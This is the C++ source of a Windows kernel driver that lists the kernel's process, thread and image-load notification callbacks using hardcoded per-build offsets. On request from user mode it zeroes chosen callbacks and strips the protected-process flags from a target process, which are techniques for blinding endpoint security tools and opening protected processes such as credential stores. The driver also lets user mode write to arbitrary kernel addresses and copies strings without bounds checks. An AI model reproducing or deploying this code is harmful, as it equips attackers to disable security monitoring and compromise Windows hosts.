#include <ntifs.h>
#include <ntddk.h>
#include <ntdef.h>
#include <aux_klib.h>
#include "ioctl.h"

constexpr auto TAG = 'tKMD';

UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\tKMD"); 
UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\tKMD");

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
void Unload(PDRIVER_OBJECT DriverObject);

ULONG64 GetSystemRoutineAddress(PCWSTR routineName);
OFFSET SetOffsetsBasedOnWindowsVersion(void);
RTL_OSVERSIONINFOW GetWindowsVersion(void);

OFFSET offset;

typedef struct _MODULE
{
	PVOID Modules;
	int NumberOfModules;
} MODULE;

_MODULE GetModules(void);

extern "C" NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	PDEVICE_OBJECT deviceObject;
	NTSTATUS status = STATUS_SUCCESS;

	DbgPrint("[+] driver has been loaded\n");

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	DriverObject->DriverUnload = Unload;

	if (!IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject))
	{
		if (IoCreateSymbolicLink(&symLink, &deviceName))
		{
			DbgPrint("[-] failed to create symlink\n");
			IoDeleteDevice(deviceObject);
			status = STATUS_FAILED_DRIVER_ENTRY;
		}
		else
		{
			offset = SetOffsetsBasedOnWindowsVersion();
		}
	}
	else 
	{
		DbgPrint("[-] failed to create device\n");
		status = STATUS_FAILED_DRIVER_ENTRY;
	}

	return status;
}

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_LIST_MODULES:
	{
		DbgPrint("[*] IOCTL_LIST_MODULES\n");

		_MODULE module = GetModules();
		auto modules = (PAUX_MODULE_EXTENDED_INFO)module.Modules;
		int numberOfModules = module.NumberOfModules;

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(PMODULE_NAMES) * 256))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PMODULE_NAMES names = (PMODULE_NAMES)Irp->UserBuffer;

		if (names == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		for (auto m = 0; m < numberOfModules; m++)
		{
			strcpy(names[m].Name, (char*)(modules[m].FullPathName));
			length += sizeof(MODULE_NAMES);
		}

		ExFreePoolWithTag(modules, TAG);
		break;
	}
	case IOCTL_CALLBACK_PROCESS:
	{
		DbgPrint("[*] IOCTL_CALLBACK_PROCESS\n");

		ULONG64 psSetCreateProcessNotifyRoutine = GetSystemRoutineAddress(L"PsSetCreateProcessNotifyRoutine");
		ULONG64 pspCreateProcessNotifyRoutineArray = psSetCreateProcessNotifyRoutine + offset.PROCESS_NOTIFY_OFFSET;
		ULONG64 arrayPointer = pspCreateProcessNotifyRoutineArray;

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(CALLBACK_INFO) * 256))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PCALLBACK_INFO callbackInfo = (PCALLBACK_INFO)Irp->UserBuffer;

		if (callbackInfo == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		_MODULE module = GetModules();
		auto modules = (PAUX_MODULE_EXTENDED_INFO)module.Modules;
		int numberOfModules = module.NumberOfModules;

		for (auto i = 0; i < 64; i++)
		{
			ULONG64 callbackAddress = *(PULONG64)(arrayPointer);
			if (callbackAddress > 0)
			{
				ULONG64 rawPointer = *(PULONG64)(callbackAddress & 0xfffffffffffffff8);

				for (auto m = 0; m < numberOfModules; m++)
				{
					auto startAddress = (ULONG64)modules[m].BasicInfo.ImageBase;
					auto endAddress = (ULONG64)(startAddress + modules[m].ImageSize);

					if (rawPointer > startAddress && rawPointer < endAddress)
					{
						strcpy(callbackInfo[i].Module, (char*)modules[m].FullPathName);
						callbackInfo[i].Address = arrayPointer;
						length += sizeof(CALLBACK_INFO);
						break;
					}
				}
			}
			arrayPointer += 8;
		}

		ExFreePoolWithTag(modules, TAG);
		break;
	}
	case IOCTL_CALLBACK_THREAD:
	{
		DbgPrint("[*] IOCTL_CALLBACK_THREAD\n");

		ULONG64 psSetCreateThreadNotifyRoutine = GetSystemRoutineAddress(L"PsSetCreateThreadNotifyRoutine");
		ULONG64 pspCreateThreadNotifyRoutine = psSetCreateThreadNotifyRoutine + offset.THREAD_NOTIFY_OFFSET;
		ULONG64 arrayPointer = pspCreateThreadNotifyRoutine;

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(CALLBACK_INFO) * 256))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PCALLBACK_INFO callbackInfo = (PCALLBACK_INFO)Irp->UserBuffer;

		_MODULE module = GetModules();
		auto modules = (PAUX_MODULE_EXTENDED_INFO) module.Modules;
		int numberOfModules = module.NumberOfModules;

		for (auto i = 0; i < 64; i++)
		{
			auto callbackAddress = *(PULONG64)arrayPointer;
			if (callbackAddress > 0)
			{
				ULONG64 rawPointer = *(PULONG64)(callbackAddress & 0xfffffffffffffff8);

				for (auto m = 0; m < numberOfModules; m++)
				{
					auto startAddress = (ULONG64)modules[m].BasicInfo.ImageBase;
					auto endAddress = (ULONG64)startAddress + modules[m].ImageSize;

					if (rawPointer > startAddress && rawPointer < endAddress)
					{
						strcpy(callbackInfo[i].Module, (char*)modules[m].FullPathName);
						callbackInfo[i].Address = arrayPointer;
						length += sizeof(CALLBACK_INFO);
						break;
					}
				}
			}
			arrayPointer += 8;
		}
		break;
	}
	case IOCTL_CALLBACK_IMAGE:
	{
		DbgPrint("[*] IOCTL_CALLBACK_IMAGE\n");
		
		ULONG64 psSetLoadImageNotifyRoutine = GetSystemRoutineAddress(L"PsSetLoadImageNotifyRoutine");
		ULONG64 pspLoadImageNotifyRoutine = psSetLoadImageNotifyRoutine + offset.IMAGE_NOTIFY_OFFSET;
		ULONG64 arrayPointer = pspLoadImageNotifyRoutine;
		
		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(CALLBACK_INFO) * 256))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PCALLBACK_INFO callbackInfo = (PCALLBACK_INFO)Irp->UserBuffer;

		_MODULE module = GetModules();
		auto modules = (PAUX_MODULE_EXTENDED_INFO)module.Modules;
		int numberOfModules = module.NumberOfModules;

		for (auto i = 0; i < 64; i++)
		{
			auto callbackAddress = *(PULONG64)arrayPointer;
			if (callbackAddress > 0)
			{
				ULONG64 rawPointer = *(PULONG64)(callbackAddress & 0xfffffffffffffff8);

				for (auto m = 0; m < numberOfModules; m++)
				{
					auto startAddress = (ULONG64)modules[m].BasicInfo.ImageBase;
					auto endAddress = (ULONG64)startAddress + modules[m].ImageSize;

					if (rawPointer > startAddress && rawPointer < endAddress)
					{
						strcpy(callbackInfo[i].Module, (char*)modules[m].FullPathName);
						callbackInfo[i].Address = arrayPointer;
						length += sizeof(CALLBACK_INFO);
						break;
					}
				}
			}
			arrayPointer += 8;
		}
		break;
	}
	case IOCTL_CALLBACK_REMOVE:
	{
		DbgPrint("[*] IOCTL_CALLBACK_REMOVE\n");

		if (stack->Parameters.DeviceIoControl.InputBufferLength < (sizeof(TARGET_CALLBACK)))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PTARGET_CALLBACK targetCallback = (PTARGET_CALLBACK)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (targetCallback == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		*(PULONG64)(targetCallback->Address) = (ULONG64)0x00;
		length += sizeof(TARGET_CALLBACK);

		break;
	}
	case IOCTL_REMOVE_PS_PROTECTION:
	{
		DbgPrint("[*] IOCTL_REMOVE_PS_PROTECTION\n");

		PTARGET_PROCESS target = (PTARGET_PROCESS)stack->Parameters.DeviceIoControl.Type3InputBuffer;
		PEPROCESS eProcess;
		status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);

		PPS_PROTECTION psProtect = (PPS_PROTECTION)(((ULONG_PTR)eProcess) + offset.PS_PROTECTION_OFFSET);
		
		if (psProtect == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			ObDereferenceObject(eProcess);
			break;
		}

		psProtect->Level = 0;
		psProtect->Type = 0;
		psProtect->Audit = 0;
		psProtect->Signer = 0;

		ObDereferenceObject(eProcess);

		break;
	}
	case IOCTL_WINDOWS_VERSION:
	{
		DbgPrint("[*] IOCTL_WINDOWS_VERSION\n");

		RTL_OSVERSIONINFOW osInfo = GetWindowsVersion();

		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(WINDOWS_VERSION)))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PWINDOWS_VERSION Version = (PWINDOWS_VERSION)Irp->UserBuffer;
		Version->MajorVersion = osInfo.dwMajorVersion;
		Version->MinorVersion = osInfo.dwMinorVersion;
		Version->BuildNumber = osInfo.dwBuildNumber;

		length += sizeof(WINDOWS_VERSION);
		break;
	}
	case IOCTL_SUPPORTED_VERSION:
	{
		if (stack->Parameters.DeviceIoControl.OutputBufferLength < (sizeof(OFFSET)))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		POFFSET pOffset = (POFFSET)Irp->UserBuffer;
		pOffset->IMAGE_NOTIFY_OFFSET = offset.IMAGE_NOTIFY_OFFSET;
		pOffset->THREAD_NOTIFY_OFFSET = offset.THREAD_NOTIFY_OFFSET;
		pOffset->PROCESS_NOTIFY_OFFSET = offset.PROCESS_NOTIFY_OFFSET;
		pOffset->PS_PROTECTION_OFFSET = offset.PS_PROTECTION_OFFSET;
		
		length += sizeof(OFFSET);

		break;
	}
	default:
	{
		status = STATUS_INVALID_DEVICE_REQUEST;
		DbgPrint("[-] unknown IOCTL code\n");
		break;
	}
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = length;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
		
	return status;
}

void Unload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("[+] driver has been unloaded\n");
}

NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

ULONG64 GetSystemRoutineAddress(PCWSTR routineName)
{
	UNICODE_STRING functionName;
	RtlInitUnicodeString(&functionName, routineName);

	return (ULONG64)MmGetSystemRoutineAddress(&functionName);
}

_MODULE GetModules(void)
{
	ULONG szBuffer = 0;
	NTSTATUS status;

	if (NT_SUCCESS(status = AuxKlibInitialize()))
	{
		if (!NT_SUCCESS(status = AuxKlibQueryModuleInformation(&szBuffer, sizeof(AUX_MODULE_EXTENDED_INFO), nullptr)))
		{
			DbgPrint("[+] AuxKlibQueryModuleInformation failed: 0x%08X\n", status);
		}
	}
	else
	{
		DbgPrint("[+] AuxKlibInitialize failed: 0x%08X\n", status);
	}

	PVOID modules = (PAUX_MODULE_EXTENDED_INFO)ExAllocatePool2(POOL_FLAG_PAGED, szBuffer, TAG);

	if (modules == nullptr)
	{
		DbgPrint("[-] PAUX_MODULE_EXTENDED_INFO was null\n");
		status = STATUS_INSUFFICIENT_RESOURCES;
	}

	RtlZeroMemory(modules, szBuffer);

	if (!NT_SUCCESS(status = AuxKlibQueryModuleInformation(&szBuffer, sizeof(AUX_MODULE_EXTENDED_INFO), modules)))
	{
		DbgPrint("[+] AuxKlibQueryModuleInformation failed: 0x%08X\n", status);
	}

	int numberOfModules = szBuffer / sizeof(AUX_MODULE_EXTENDED_INFO);

	return _MODULE{ modules, numberOfModules };
}

RTL_OSVERSIONINFOW GetWindowsVersion(void)
{
	NTSTATUS status;
	RTL_OSVERSIONINFOW osInfo = { 0 };
	osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	status = RtlGetVersion(&osInfo);
	return osInfo;
}

OFFSET SetOffsetsBasedOnWindowsVersion(void)
{
	RTL_OSVERSIONINFOW osInfo = GetWindowsVersion();
	offset = { 0 };
	if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0 && osInfo.dwBuildNumber == 22621)
	{
		offset.PROCESS_NOTIFY_OFFSET = 0x004f18c0;
		offset.IMAGE_NOTIFY_OFFSET = 0x004f1640;
		offset.THREAD_NOTIFY_OFFSET = 0x004f1820;
		offset.PS_PROTECTION_OFFSET = 0x87a;
	}
	else if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0 && osInfo.dwBuildNumber == 26100)
	{
		offset.PROCESS_NOTIFY_OFFSET = 0x007af280;
		offset.IMAGE_NOTIFY_OFFSET = 0x007aef90;
		offset.THREAD_NOTIFY_OFFSET = 0x007aee10;
		offset.PS_PROTECTION_OFFSET = 0x5fa;
	}
	else if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0 && osInfo.dwBuildNumber == 22631)
	{
		offset.PROCESS_NOTIFY_OFFSET = 0x004f0b90;
		offset.IMAGE_NOTIFY_OFFSET = 0x004f0910;
		offset.THREAD_NOTIFY_OFFSET = 0x004f0af0;
		offset.PS_PROTECTION_OFFSET = 0x87a;
	}
	else 
	{
		offset.PROCESS_NOTIFY_OFFSET = 0x00;
		offset.IMAGE_NOTIFY_OFFSET = 0x00;
		offset.THREAD_NOTIFY_OFFSET = 0x00;
		offset.PS_PROTECTION_OFFSET = 0x00;
	}
	return offset;
}